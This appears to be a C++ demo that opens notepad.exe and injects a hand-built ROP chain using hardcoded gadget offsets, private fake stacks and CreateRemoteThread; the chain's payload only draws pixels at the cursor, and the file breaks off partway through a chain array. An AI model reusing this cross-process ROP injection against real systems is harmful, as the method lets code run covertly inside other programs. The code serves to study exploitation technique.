#include <windows.h>
#include <iostream>
#include <TlHelp32.h>
#include <cstring>

// Returns the process ID of the first running image whose executable name matches szProcName.
DWORD GetProcessIdByName(const wchar_t* szProcName)
{
    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pe32{};
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnap, &pe32))
        {
            do
            {
                if (_wcsicmp(pe32.szExeFile, szProcName) == 0)
                {
                    pid = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pe32));
        }
        CloseHandle(hSnap);
    }
    return pid;
}

// Returns the load base of szModuleName in the target process, or 0 if the module is not loaded.
uint64_t GetRemoteModuleBase(HANDLE hProcess, DWORD pid, const wchar_t* szModuleName)
{
    uint64_t baseAddr = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (hSnap != INVALID_HANDLE_VALUE)
    {
        MODULEENTRY32 me32{};
        me32.dwSize = sizeof(MODULEENTRY32);
        if (Module32First(hSnap, &me32))
        {
            do
            {
                if (_wcsicmp(me32.szModule, szModuleName) == 0)
                {
                    baseAddr = (uint64_t)me32.modBaseAddr;
                    break;
                }
            } while (Module32Next(hSnap, &me32));
        }
        CloseHandle(hSnap);
    }
    return baseAddr;
}

/*
 * Notepad pixel-tracer ROP demo — memory map
 * =============================================================================
 * Main ROP block: VirtualAllocEx(..., 0x2000) — 8 KiB RW @ MainRopBlock
 * Sub ROP block: VirtualAllocEx(..., 0x2000) — 8 KiB RW @  SubRopBlock
 * 
 *                              high VA
 *                    +---------------------------+  mainBlockBase + 0x2000
 *     mainRopBase    |  main ROP chain (4 KiB)   |  CreateRemoteThread lpParameter
 *     (high 4 KiB)   |                            |  -> mainRopBase
 *                    + - - - - - - - - - - - - - +  mainBlockBase + 0x1000
 *     mainDataBase   |  Data (low 4 KiB)         |
 *     (low 4 KiB)    |  +0x00 hDC_store (QWORD)  |
 *                    |  +0x08 POINT {x,y}        |
 *                    |  +0x20 DelayInterval (LI)  |
 *                    |  +0x30 DrawMode (QWORD)   |
 *                    +---------------------------+  mainBlockBase (low VA)
 *
 *                              high VA
 *                    +---------------------------+  subBlockBase + 0x2000
 *     subRopBase     |  Sub ROP chain (high 4KiB)|  DrawMode branch (if/else in ROP)
 *     (high 4 KiB)   |                            |  Entry: mainRopChain[30] = subRopBase
 *                    + - - - - - - - - - - - - - +  subBlockBase + 0x1000
 *     subDataBase    |  Save/restore slots:       |
 *     (low 4 KiB)    |  +0x00 save_rcx_store     |
 *                    |  +0x08 save_rdx_store     |
 *                    |  +0x10 save_r8_store       |
 *                    |  +0x18 save_r9_store       |
 *                    +---------------------------+  subBlockBase (low VA)
 *
 * Five private 8 KiB stacks (page-aligned, VirtualAllocEx guarantee for 4 KiB multiples),
 * each with a 3-QWORD synthetic frame at (stackTop - 0x40):
 *
 *   getDCStackTop     -> GetDC(NULL)          returns to mainRopChain[4]  (A_pos1)
 *   cursorPosStackTop -> GetCursorPos         returns to mainRopChain[11] (A_pos2)
 *   setPixelStackTop  -> NtGdiSetPixel        returns to mainRopChain[37] (A_pos3)
 *   lineToStackTop    -> NtGdiLineTo          returns to mainRopChain[37] (A_pos3, shared)
 *   delayStackTop     -> NtDelayExecution     returns to mainRopChain[43] (A_pos4) -> loop
 *
 * stackTop = alloc + 0x2000 (top of 8 KiB slot; stack grows down).
 *
 * =============================================================================
 * Main loop flow (infinite after first GetDC; cross-chain jumps included inline)
 * =============================================================================
 *   [0..3]   one-shot GetDC(NULL)
 *   [4..6]   store hDC
 *   ── LOOP HEAD = mainRopChain[7] ──
 *   [7..10]   GetCursorPos → write mouse XY to mainDataBase
 *   [11..28]  marshal NtGdiSetPixel(hDC, X, Y, 0x00FF0000) into rcx/rdx/r8/r9
 *   [29..30]  → Sub ROP (subRopBase): save rcx/rdx, test DrawMode, restore, pop rsp back
 *   [31..34]  NtGdiSetPixel via setPixelStackTop     (DrawMode != 0 → SetPixel path)
 *   [35..36]  NtGdiLineTo   via lineToStackTop       (DrawMode == 0 → LineTo   path)
 *   [37..42]  both paths converge at mainRopChain[37] (A_pos3) → NtDelayExecution(-500ms)
 *   [43..44]  pop rsp → A_pin (mainRopChain[7]) → next iteration
 *
 * Sub ROP exit points (ropSubChain → mainRopChain):
 *   ropSubChain[24..25]  pop rsp → mainRopChain[31]  (DrawMode != 0 → SetPixel)
 *   ropSubChain[34..35]  pop rsp → mainRopChain[35]  (DrawMode == 0 → LineTo)
 *
 * Gadget RVAs are build-specific; re-extract with Hawkeye ROP on the same target image.
 */

int main()
{
    const wchar_t* TARGET_PROC = L"notepad.exe";

    // --- 1. Resolve the Notepad process ID ---
    DWORD pid = GetProcessIdByName(TARGET_PROC);
    if (pid == 0)
    {
        std::wcout << L"[!] Target process not found: " << TARGET_PROC << std::endl;
        return -1;
    }
    std::cout << "[+] Target PID: " << pid << std::endl;
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == nullptr)
    {
        std::cout << "[!] OpenProcess failed, Err:" << GetLastError() << std::endl;
        return -1;
    }

    // --- 2. Module bases for gadgets used by this chain ---
    uint64_t base_nvwgf2umx = GetRemoteModuleBase(hProcess, pid, L"nvwgf2umx.dll");
    uint64_t base_ntdll = GetRemoteModuleBase(hProcess, pid, L"ntdll.dll");
    uint64_t base_combase = GetRemoteModuleBase(hProcess, pid, L"combase.dll");
    uint64_t base_d2d1 = GetRemoteModuleBase(hProcess, pid, L"d2d1.dll");
    uint64_t base_kernel32 = GetRemoteModuleBase(hProcess, pid, L"kernel32.dll");
    uint64_t base_kernelbase = GetRemoteModuleBase(hProcess, pid, L"kernelbase.dll");
    uint64_t base_urlmon = GetRemoteModuleBase(hProcess, pid, L"urlmon.dll");
    uint64_t base_dcomp = GetRemoteModuleBase(hProcess, pid, L"dcomp.dll");

    if (!base_nvwgf2umx || !base_ntdll || !base_combase || !base_d2d1 || !base_kernel32 || !base_kernelbase || !base_urlmon || !base_dcomp)
    {
        std::cout << "[!] Failed to resolve module bases; ensure Notepad loaded the DLLs listed above."
                  << std::endl;
        CloseHandle(hProcess);
        return -1;
    }
    std::cout << "[+] nvwgf2umx.dll base: 0x" << std::hex << base_nvwgf2umx << std::endl;
    std::cout << "[+] ntdll.dll base:     0x" << std::hex << base_ntdll << std::endl;
    std::cout << "[+] combase.dll base:   0x" << std::hex << base_combase << std::endl;
    std::cout << "[+] d2d1.dll base:      0x" << std::hex << base_d2d1 << std::endl;
    std::cout << "[+] kernel32.dll base:  0x" << std::hex << base_kernel32 << std::endl;
    std::cout << "[+] kernelbase.dll base:0x" << std::hex << base_kernelbase << std::endl;

    // --- 3. Gadget VAs (module base + RVA; version-bound) ---
    // [ENTRY] push rcx; pop rsp; ret  — CreateRemoteThread entry, switches RSP to main ROP chain
    uint64_t gadget_entry = base_nvwgf2umx + 0x3c297e;

    // [POP] Universal argument loading
    uint64_t gadget_pop_rcx_ret = base_ntdll    + 0x12429e;  // pop rcx; ret
    uint64_t gadget_pop_rdx_ret = base_kernelbase + 0x184ce9; // pop rdx; ret
    uint64_t gadget_pop_r8_ret  = base_ntdll    + 0x062de9;  // pop r8; ret
    uint64_t gadget_pop_r9_ret  = base_nvwgf2umx + 0x1201eb3; // pop r9; ret
    uint64_t gadget_pop_rax_ret = base_ntdll    + 0x0615da;  // pop rax; ret
    uint64_t gadget_pop_rsp_ret = base_ntdll    + 0x0151c3;  // pop rsp; ret

    // [REG->REG] Register-to-register move / swap / truncate
    uint64_t gadget_mov_rcx_rax_ret  = base_combase   + 0x0c458c;  // mov rcx, rax; ...
    uint64_t gadget_mov_rdx_rax_ret  = base_urlmon    + 0x097df5;  // mov rdx, rax; mov rax, rdx; ret
    uint64_t gadget_xchg_edx_eax_ret = base_kernel32  + 0x04c89b;  // xchg edx, eax; ret
    uint64_t gadget_mov_r8d_eax_ret  = base_d2d1      + 0x0708f6;  // mov r8d, eax; ...

    // [WRITE MEM] Store register value into memory
    uint64_t gadget_mov_mem_rax_rcx_ret = base_kernelbase + 0x125f9a; // mov [rax], rcx; ret
    uint64_t gadget_mov_mem_rax_rdx_ret = base_nvwgf2umx  + 0x182c854; // mov [rax], rdx; ret
    uint64_t gadget_mov_mem_rcx_rax_ret = base_ntdll      + 0x0e7ed3; // mov [rcx], rax; ret
    uint64_t gadget_mov_mem_rcx_eax_ret = base_ntdll      + 0x0e09d8; // mov [rcx], eax; ret

    // [READ MEM] Load value from memory into register (dereference)
    uint64_t gadget_mov_mem_rax_rax_ret = base_d2d1  + 0x18a88b;  // mov rax, [rax]; ret
    uint64_t gadget_mov_eax_deref_rax_ret = base_ntdll + 0x0448d7; // mov eax, [rax]; ret
    uint64_t gadget_mov_mem_rcx_rcx_ret = base_dcomp + 0x14da67; // mov rcx, [rcx]; mov rax, rcx; ret

    // [CONTROL FLOW] Jump / conditional branch
    uint64_t gadget_jmp_rax_ret = base_nvwgf2umx + 0x0f6d6f; // jmp rax; ret
    uint64_t gadget_test_ecx_cmovz_rax_rdx_ret = base_d2d1 + 0x12a237; // test ecx, ecx; cmovz rax, rdx; ret

    // [STACK SKIP] Skip N elements on the stack
    uint64_t gadget_add_rsp_8h_ret  = base_ntdll + 0x013d49; // add rsp, 8h; ret
    uint64_t gadget_add_rsp_10h_ret = base_ntdll + 0x166458; // add rsp, 10h; ret
    uint64_t gadget_add_rsp_18h_ret = base_ntdll + 0x071432; // add rsp, 18h; ret
    uint64_t gadget_add_rsp_48h_ret = base_ntdll + 0x0026f9; // add rsp, 48h; ret
    uint64_t gadget_add_rsp_58h_ret = base_ntdll + 0x0615d7; // add rsp, 58h; ret

    // --- 4. Resolve API VAs (local LoadLibrary; same VAs in target for this demo) ---
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    HMODULE hGdi32 = LoadLibraryA("gdi32.dll");
    HMODULE hKernel32Local = LoadLibraryA("kernel32.dll");
    HMODULE hWin32u = LoadLibraryA("win32u.dll");
    if (!hUser32 || !hGdi32 || !hKernel32Local || !hWin32u)
    {
        std::cout << "[!] LoadLibrary failed." << std::endl;
        CloseHandle(hProcess);
        return -1;
    }
    uint64_t pGetDC = (uint64_t)GetProcAddress(hUser32, "GetDC");
    uint64_t pGetCursorPos = (uint64_t)GetProcAddress(hUser32, "GetCursorPos");
    uint64_t pSetPixel = (uint64_t)GetProcAddress(hGdi32, "SetPixel");
    uint64_t pZwGdiSetPixel = (uint64_t)GetProcAddress(hWin32u, "NtGdiSetPixel");
    uint64_t pZwGdiLineTo = (uint64_t)GetProcAddress(hWin32u, "NtGdiLineTo");
    uint64_t pSleep = (uint64_t)GetProcAddress(hKernel32Local, "Sleep");
    uint64_t pNtDelayExecution = (uint64_t)GetProcAddress((HMODULE)base_ntdll, "NtDelayExecution");
    std::cout << "[+] GetDC VA:              0x" << std::hex << pGetDC << std::endl;
    std::cout << "[+] GetCursorPos VA:       0x" << std::hex << pGetCursorPos << std::endl;
    std::cout << "[+] SetPixel VA:           0x" << std::hex << pSetPixel << std::endl;
    std::cout << "[+] NtGdiLineTo VA:           0x" << std::hex << pZwGdiLineTo << std::endl;
    std::cout << "[+] NtGdiSetPixel VA:      0x" << std::hex << pZwGdiSetPixel << std::endl;
    std::cout << "[+] Sleep VA:              0x" << std::hex << pSleep << std::endl;
    std::cout << "[+] NtDelayExecution VA:   0x" << std::hex << pNtDelayExecution << std::endl;

    uint64_t gadget_mov_rax_deref_rcx_ret = (uint64_t)hUser32 + 0x92fc7; // mov rax, [rcx] ; ret

    // --- 5. ROP blocks (VirtualAllocEx, 8 KiB each; see top-of-file layout) ---
    // 5a. Main ROP block
    LPVOID pMainRopBlock = VirtualAllocEx(hProcess, nullptr, 0x2000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    // 5b. Sub ROP block (DrawMode branch logic)
    LPVOID pSubRopBlock = VirtualAllocEx(hProcess, nullptr, 0x2000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pMainRopBlock || !pSubRopBlock)
    {
        std::cout << "[!] VirtualAllocEx (ROP blocks) failed. Err:" << GetLastError() << std::endl;
        if (pMainRopBlock) VirtualFreeEx(hProcess, pMainRopBlock, 0, MEM_RELEASE);
        if (pSubRopBlock)  VirtualFreeEx(hProcess, pSubRopBlock, 0, MEM_RELEASE);
        FreeLibrary(hUser32);
        FreeLibrary(hGdi32);
        FreeLibrary(hKernel32Local);
        FreeLibrary(hWin32u);
        CloseHandle(hProcess);
        return -1;
    }
    // main ROP block layout (low 4 KiB = data, high 4 KiB = chain)
    uint64_t mainBlockBase = (uint64_t)pMainRopBlock;
    uint64_t mainDataBase  = mainBlockBase;                  // +0x0000
    uint64_t mainRopBase   = mainBlockBase + 0x1000;         // +0x1000
    // sub ROP block layout (same as main)
    uint64_t subBlockBase = (uint64_t)pSubRopBlock;
    uint64_t subDataBase  = subBlockBase;                     // +0x0000 — save_rcx/store_rdx
    uint64_t subRopBase   = subBlockBase + 0x1000;            // +0x1000 — Sub ROP chain

    std::cout << "[+] mainBlockBase: 0x" << std::hex << mainBlockBase << std::endl;
    std::cout << "[+] mainRopBase:    0x" << std::hex << mainRopBase << std::endl;
    std::cout << "[+] mainDataBase:   0x" << std::hex << mainDataBase << std::endl;
    std::cout << "[+] subBlockBase:   0x" << std::hex << subBlockBase << std::endl;
    std::cout << "[+] subRopBase:     0x" << std::hex << subRopBase << std::endl;
    std::cout << "[+] subDataBase:    0x" << std::hex << subDataBase << std::endl;

    // mainDataBase layout (offsets from mainDataBase)
    uint64_t addr_hDC_store    = mainDataBase + 0x00;
    uint64_t addr_point_buf    = mainDataBase + 0x08;
    uint64_t addr_delayInterval = mainDataBase + 0x20;
    uint64_t addr_drawMode     = mainDataBase + 0x30;
    std::cout << "[+] hDC slot:           0x" << std::hex << addr_hDC_store << std::endl;
    std::cout << "[+] POINT buffer:       0x" << std::hex << addr_point_buf << std::endl;
    std::cout << "[+] DelayInterval ptr:  0x" << std::hex << addr_delayInterval << std::endl;
    std::cout << "[+] DrawMode ptr:       0x" << std::hex << addr_drawMode << std::endl;
    
    //Sleep(DelayInterval)
    LARGE_INTEGER DelayInterval;
    DelayInterval.QuadPart = -500 * 10000; // 500 ms relative interval for NtDelayExecution
    WriteProcessMemory(hProcess, (LPVOID)addr_delayInterval, &DelayInterval, sizeof(LARGE_INTEGER), nullptr);
    //0: LineTo    1: SetPixel
    uint64_t drawMode = 0;
    WriteProcessMemory(hProcess, (LPVOID)addr_drawMode, &drawMode, sizeof(uint64_t), nullptr);

    // --- 6. Five 8 KiB private stacks (one per API; VirtualAllocEx returns page-aligned = 16-byte aligned) ---
    LPVOID pGetDCStack     = VirtualAllocEx(hProcess, nullptr, 0x2000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    LPVOID pCursorPosStack = VirtualAllocEx(hProcess, nullptr, 0x2000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    LPVOID pSetPixelStack  = VirtualAllocEx(hProcess, nullptr, 0x2000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    LPVOID pLineToStack    = VirtualAllocEx(hProcess, nullptr, 0x2000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    LPVOID pDelayStack     = VirtualAllocEx(hProcess, nullptr, 0x2000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pGetDCStack || !pCursorPosStack || !pSetPixelStack || !pLineToStack || !pDelayStack)
    {
        std::cout << "[!] Private stack allocation failed." << std::endl;
        VirtualFreeEx(hProcess, pMainRopBlock, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, pSubRopBlock, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, pGetDCStack, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, pCursorPosStack, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, pSetPixelStack, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, pLineToStack, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, pDelayStack, 0, MEM_RELEASE);
        FreeLibrary(hUser32);
        FreeLibrary(hGdi32);
        FreeLibrary(hKernel32Local);
        FreeLibrary(hWin32u);
        CloseHandle(hProcess);
        return -1;
    }
    // stackTop = alloc + 0x2000 (top of 8 KiB; stack grows down)
    uint64_t getDCStackTop     = (uint64_t)pGetDCStack     + 0x2000;
    uint64_t cursorPosStackTop = (uint64_t)pCursorPosStack + 0x2000;
    uint64_t setPixelStackTop  = (uint64_t)pSetPixelStack  + 0x2000;
    uint64_t lineToStackTop    = (uint64_t)pLineToStack    + 0x2000;
    uint64_t delayStackTop     = (uint64_t)pDelayStack     + 0x2000;
    std::cout << "[+] GetDC stack top:        0x" << std::hex << getDCStackTop << std::endl;
    std::cout << "[+] GetCursorPos stack top: 0x" << std::hex << cursorPosStackTop << std::endl;
    std::cout << "[+] SetPixel stack top:     0x" << std::hex << setPixelStackTop << std::endl;
    std::cout << "[+] LineTo stack top:       0x" << std::hex << lineToStackTop << std::endl;
    std::cout << "[+] Delay stack top:        0x" << std::hex << delayStackTop << std::endl;

    // --- 7. Resume labels in mainRopBase (index * 8) ---
    const size_t off_pos1 = 4 * sizeof(uint64_t);
    const size_t off_pos2 = 11 * sizeof(uint64_t);
    const size_t off_pos3 = 37 * sizeof(uint64_t);
    const size_t off_pos4 = 43 * sizeof(uint64_t);
    const size_t off_pos5 = 37 * sizeof(uint64_t);
    uint64_t A_pos1 = mainRopBase + off_pos1;
    uint64_t A_pos2 = mainRopBase + off_pos2;
    uint64_t A_pos3 = mainRopBase + off_pos3;
    uint64_t A_pos4 = mainRopBase + off_pos4;
    uint64_t A_pos5 = mainRopBase + off_pos5;
    std::cout << "[+] A_pos1 (after GetDC):        0x" << std::hex << A_pos1 << std::endl;
    std::cout << "[+] A_pos2 (after GetCursorPos): 0x" << std::hex << A_pos2 << std::endl;
    std::cout << "[+] A_pos3 (after SetPixel):     0x" << std::hex << A_pos3 << std::endl;
    std::cout << "[+] A_pos4 (after delay):        0x" << std::hex << A_pos4 << std::endl;
    std::cout << "[+] A_pos5 (after LineTo):        0x" << std::hex << A_pos5 << std::endl;

    const size_t off_pin = 7 * sizeof(uint64_t);
    uint64_t A_pin = mainRopBase + off_pin;
    std::cout << "[+] A_pin (loop head):           0x" << std::hex << A_pin << std::endl;

    const size_t off_mainRop_setPixelPin = 31 * sizeof(uint64_t);
    uint64_t mainRop_setPixelPin = mainRopBase + off_mainRop_setPixelPin;
    std::cout << "[+] mainRop_setPixelPin (call SetPixel):           0x" << std::hex << mainRop_setPixelPin << std::endl;

    const size_t off_mainRop_lineToPin = 35 * sizeof(uint64_t);
    uint64_t mainRop_lineToPin = mainRopBase + off_mainRop_lineToPin;
    std::cout << "[+] mainRop_lineToPin (call LineTo):           0x" << std::hex << mainRop_lineToPin << std::endl;

    // --- 8. Install synthetic stack frames (3 QWORDs each) ---
    uint64_t frameGetDC[] = { pGetDC, gadget_pop_rsp_ret, A_pos1 };
    WriteProcessMemory(hProcess, (LPVOID)(getDCStackTop - 0x40), frameGetDC, sizeof(frameGetDC), nullptr);
    uint64_t frameCursorPos[] = { pGetCursorPos, gadget_pop_rsp_ret, A_pos2 };
    WriteProcessMemory(hProcess, (LPVOID)(cursorPosStackTop - 0x40), frameCursorPos, sizeof(frameCursorPos), nullptr);
    uint64_t frameSetPixel[] = { pZwGdiSetPixel, gadget_pop_rsp_ret, A_pos3 };
    WriteProcessMemory(hProcess, (LPVOID)(setPixelStackTop - 0x40), frameSetPixel, sizeof(frameSetPixel), nullptr);
    uint64_t frameDelay[] = { pNtDelayExecution, gadget_pop_rsp_ret, A_pos4 };
    WriteProcessMemory(hProcess, (LPVOID)(delayStackTop - 0x40), frameDelay, sizeof(frameDelay), nullptr);
    uint64_t frameLineTo[] = { pZwGdiLineTo, gadget_pop_rsp_ret, A_pos5 };
    WriteProcessMemory(hProcess, (LPVOID)(lineToStackTop - 0x40), frameLineTo, sizeof(frameLineTo), nullptr);



    // --- 9. mainRopChain (mainRopBase) ---
    // Entry: gadget_entry (push rcx; pop rsp; ret) sets RSP = mainRopBase
    //
    // Overall flow (infinite loop after first GetDC):
    //   [0..3]   One-shot: GetDC(NULL) → get window DC
    //   [4..6]   Store hDC to mainDataBase
    //   ── LOOP HEAD (A_pin = index 7) ──
    //   [7..10]   GetCursorPos → write mouse XY into mainDataBase
    //   [11..28]  Marshal NtGdiSetPixel(hDC, X, Y, 0x00FF0000) into rcx/rdx/r8/r9
    //   [29..30]  Pop rsp to subRopBase → Sub ROP handles DrawMode branch
    //   [31..34]  mainRop_setPixel_pin → NtGdiSetPixel via setPixelStackTop
    //   [35..36]  mainRop_lineTo_pin   → NtGdiLineTo   via lineToStackTop
    //   [37..42]  NtDelayExecution(-500ms) via delayStackTop
    //   [43..44]  Pop rsp → A_pin (index 7) → next loop iteration
    uint64_t mainRopChain[] = {
        // ============================
        // One-shot: GetDC(NULL) — only runs once at startup; hDC reused every loop
        // ============================
        gadget_pop_rcx_ret,          // [0]  rcx = NULL (hWnd)
        0ULL,                        // [1]
        gadget_pop_rsp_ret,          // [2]
        getDCStackTop - 0x40,        // [3]  RSP → GetDC private stack; GetDC executes, returns to A_pos1

        // ============================
        // A_pos1: GetDC returned — save hDC (RAX) to mainDataBase
        // ============================
        gadget_pop_rcx_ret,          // [4]  << A_pos1 resumes here
        addr_hDC_store,              // [5]  rcx = &hDC_store
        gadget_mov_mem_rcx_eax_ret,  // [6]  [hDC_store] = eax (hDC)

        // ============================
        // A_pin (loop head): GetCursorPos → poll mouse position
        // ============================
        gadget_pop_rcx_ret,          // [7]  << A_pin (entry of every loop iteration)
        addr_point_buf,              // [8]  rcx = &POINT buffer
        gadget_pop_rsp_ret,          // [9]
        cursorPosStackTop - 0x40,    // [10] RSP → GetCursorPos stack; writes [POINT.x, POINT.y], returns to A_pos2

        // ============================
        // A_pos2: marshal 4 args for NtGdiSetPixel(hDC, X, Y, 0x00FF0000)
        //   rcx = hDC (from mainDataBase)
        //   rdx = POINT.x (mouse X)
        //   r8  = POINT.y (mouse Y)
        //   r9  = 0x00FF0000 (RGB red)
        // ============================
        gadget_pop_rcx_ret,          // [11] << A_pos2 resumes here
        addr_hDC_store,              // [12] rcx = &hDC_store
        gadget_mov_rax_deref_rcx_ret,// [13] rax = [rcx] = hDC (dereference)
        gadget_mov_rcx_rax_ret,      // [14] rcx = rax = hDC ✅ arg1
        gadget_pop_rax_ret,          // [15]
        addr_point_buf,              // [16] rax = &POINT.x
        gadget_mov_eax_deref_rax_ret,// [17] eax = [rax] = POINT.x
        gadget_pop_rdx_ret,          // [18]
        0ULL,                        // [19] rdx = 0 (clean upper bits)
        gadget_xchg_edx_eax_ret,     // [20] edx ↔ eax → rdx = POINT.x ✅ arg2
        gadget_pop_rax_ret,          // [21]
        addr_point_buf + 4,          // [22] rax = &POINT.y
        gadget_mov_eax_deref_rax_ret,// [23] eax = [rax] = POINT.y
        gadget_pop_r8_ret,           // [24]
        0ULL,                        // [25] r8 = 0 (clean upper bits)
        gadget_mov_r8d_eax_ret,      // [26] r8d = eax → r8 = POINT.y ✅ arg3
        gadget_pop_r9_ret,           // [27]
        0x00FF0000ULL,               // [28] r9 = RGB red ✅ arg4

        // ============================
        // Enter Sub ROP chain for DrawMode branch
        //   Sub ROP does: save rcx/rdx → test DrawMode → restore rcx/rdx → pop rsp
        //   Sub ROP exit = pop rsp to one of two hardcoded main-chain indices:
        //     DrawMode != 0 → pop rsp = mainRopChain[31]  (SetPixel path entry)
        //     DrawMode == 0 → pop rsp = mainRopChain[35]  (LineTo   path entry)
        // ============================
        gadget_pop_rsp_ret,          // [29]
        subRopBase,                  // [30] RSP → subRopBase

        // ============================
        // mainRop_setPixel_pin: SetPixel path
        //   Sub ROP SetPixel-restore ends with pop rsp → lands here (mainRopChain[31])
        //   rcx/rdx/r8/r9 already restored by Sub ROP
        // ============================
        gadget_pop_rsp_ret,          // [31] << Sub ROP jumps here (DrawMode != 0)
        setPixelStackTop - 0x40,     // [32] RSP → SetPixel private stack
        gadget_pop_rsp_ret,          // [33]
        A_pos3,                      // [34] RSP → A_pos3 after SetPixel returns

        // ============================
        // mainRop_lineTo_pin: LineTo path
        //   Sub ROP LineTo-restore ends with pop rsp → lands here (mainRopChain[35])
        //   rcx/rdx/r8/r9 already restored by Sub ROP
        // ============================
        gadget_pop_rsp_ret,          // [35] << Sub ROP jumps here (DrawMode == 0)
        lineToStackTop - 0x40,       // [36] RSP → LineTo private stack (returns to A_pos3)

        // ============================
        // A_pos3: NtDelayExecution(-500ms) — throttle before next loop
        //   NtDelayExecution(Alertable=FALSE, PLARGE_INTEGER DelayInterval)
        // ============================
        gadget_pop_rcx_ret,          // [37] << A_pos3 resumes here (both SetPixel and LineTo converge)
        0ULL,                        // [38] rcx = FALSE (Alertable)
        gadget_pop_rdx_ret,          // [39]
        addr_delayInterval,          // [40] rdx = &DelayInterval (value = -500ms)
        gadget_pop_rsp_ret,          // [41]
        delayStackTop - 0x40,        // [42] RSP → Delay private stack; sleeps 500ms, returns to A_pos4

        // ============================
        // A_pos4: loop back to A_pin (index 7) for next iteration
        // ============================
        gadget_pop_rsp_ret,          // [43] << A_pos4 resumes here
        A_pin                        // [44] RSP = A_pin → jump to index 7 → another loop
    };

    size_t mainRopChainSize = sizeof(mainRopChain);
    WriteProcessMemory(hProcess, (LPVOID)mainRopBase, mainRopChain, mainRopChainSize, nullptr);
    std::cout << "[+] mainRopChain written to mainRopBase (" << std::dec << mainRopChainSize << " bytes)" << std::endl;

    ///////////////////////////////
    

    uint64_t save_rcx_store = subDataBase + 0x00;
    uint64_t save_rdx_store = subDataBase + 0x08;
    uint64_t save_r8_store = subDataBase + 0x10;
    uint64_t save_r9_store = subDataBase + 0x18;
    std::cout << "[+] save_rcx slot:           0x" << std::hex << save_rcx_store << std::endl;
    std::cout << "[+] save_rdx slot:           0x" << std::hex << save_rdx_store << std::endl;
    std::cout << "[+] save_r8 slot:           0x" << std::hex << save_r8_store << std::endl;
    std::cout << "[+] save_r9 slot:           0x" << std::hex << save_r9_store << std::endl;

    // --- Sub ROP chain (subRopBase): DrawMode branch ---
    // Entry state: rcx=hDC, rdx=X, r8=Y, r9=0x00FF0000 (SetPixel args from main chain)
    //
    // Structure:
    //   [0..5]   Save rcx/rdx to subDataBase (emulate push)
    //   [6..8]   Load DrawMode value into ecx for condition test
    //   [9..15]  if/else: pick add_rsp gadget based on DrawMode, jmp to selected path
    //   [16..24] SetPixel path  — restore rcx/rdx, pop rsp back to main chain
    //   [25..34] LineTo path    — restore rcx/rdx, pop rsp back to main chain
    uint64_t ropSubChain[] = {
        // ============================
        // Save rcx & rdx (r8/r9 unchanged, no need to save)
        // ============================
        gadget_pop_rax_ret,          //[0]  rax = &save_rcx_store
        save_rcx_store,              //[1]
        gadget_mov_mem_rax_rcx_ret,  //[2]  [save_rcx_store] = rcx  (save hDC)
        gadget_pop_rax_ret,          //[3]  rax = &save_rdx_store
        save_rdx_store,              //[4]
        gadget_mov_mem_rax_rdx_ret,  //[5]  [save_rdx_store] = rdx  (save X)

        // ============================
        // Load DrawMode -> ecx (for test ecx,ecx)
        // ============================
        gadget_pop_rcx_ret,          //[6]  rcx = &addr_drawMode
        addr_drawMode,               //[7]
        gadget_mov_mem_rcx_rcx_ret,  //[8]  rcx = [addr_drawMode]

        // ============================
        // if (DrawMode == 0) goto sub_LineTo_pin; else goto sub_SetPixel_pin;
        //   pop rax -> gadget_add_rsp_8h_ret   (short skip, lands on [16] = SetPixel restore)
        //   pop rdx -> gadget_add_rsp_58h_ret  (long skip,  lands on [25] = LineTo   restore)
        //   test ecx,ecx; cmovz rax,rdx       (rax = (DrawMode==0 ? long : short))
        //   jmp rax                            (execute selected add_rsp; ret lands on target)
        // After restore, each path ends with pop rsp → mainRopChain[31] or mainRopChain[35]
        // ============================
        gadget_pop_rax_ret,          //[9]  rax = add_rsp_8h_ret (short)
        gadget_add_rsp_8h_ret,       //[10] (data: address of short-skip gadget)
        gadget_pop_rdx_ret,          //[11] rdx = add_rsp_58h_ret (long)
        gadget_add_rsp_58h_ret,      //[12] (data: address of long-skip gadget)
        gadget_test_ecx_cmovz_rax_rdx_ret, //[13] test ecx,ecx; cmovz rax,rdx → rax = selected gadget
        gadget_jmp_rax_ret,          //[14] jmp rax → execute add_rsp_XXh_ret; ret lands on restore entry
        90ull,                       //[15] noise (skipped by both add_rsp paths; no add_rsp_0h gadget available)

        // ============================
        // sub_SetPixel_pin: restore rcx & rdx; then pop rsp → mainRopChain[31]
        // ============================
        gadget_pop_rax_ret,          //[16] rax = &save_rcx_store
        save_rcx_store,              //[17]
        gadget_mov_mem_rax_rax_ret,  //[18] rax = [save_rcx_store]  (dereference saved hDC)
        gadget_mov_rcx_rax_ret,      //[19] rcx = rax  (restore hDC)
        gadget_pop_rax_ret,          //[20] rax = &save_rdx_store
        save_rdx_store,              //[21]
        gadget_mov_mem_rax_rax_ret,  //[22] rax = [save_rdx_store]  (dereference saved X)
        gadget_mov_rdx_rax_ret,      //[23] rdx = rax  (restore X)
        gadget_pop_rsp_ret,          //[24] RSP → mainRop_setPixelPin → ret = mainRopChain[31]
        mainRop_setPixelPin,         //[25] (value = mainRopBase + 31*8)

        // ============================
        // sub_LineTo_pin: restore rcx & rdx; then pop rsp → mainRopChain[35]
        // ============================
        gadget_pop_rax_ret,          //[26] rax = &save_rcx_store
        save_rcx_store,              //[27]
